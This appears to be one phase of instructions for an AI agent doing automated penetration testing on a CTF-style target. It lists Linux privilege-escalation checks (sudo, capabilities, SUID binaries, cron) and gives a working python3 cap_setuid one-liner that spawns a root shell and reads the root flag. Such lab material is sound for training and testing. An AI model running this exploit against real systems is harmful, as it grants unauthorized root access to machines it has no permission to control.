## Phase 4: Privilege Escalation

Escalate to root.

### Priority Order (fastest first)
1. `sudo -l` — check sudo permissions
2. `getcap -r / 2>/dev/null` — check Linux capabilities (cap_setuid is instant root)
3. SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
4. Cron jobs: `cat /etc/crontab; ls -la /etc/cron.d/`
5. LinPEAS only if above checks find nothing

### Exploiting Capabilities
If you find `cap_setuid` on python: `/usr/bin/python3 -c "import os; os.setuid(0); os.system('/bin/bash -c \"id; cat /root/root.txt\"')"`

### After Getting Root
- Run `id` to confirm root
- Read root flag: `cat /root/root.txt`
- Call `append_report` with the full attack chain
- Call `transition_phase` with `next_phase: "complete"`

### IMPORTANT
When you have root and the root flag, call transition_phase with next_phase="complete" immediately. Do not continue scanning.
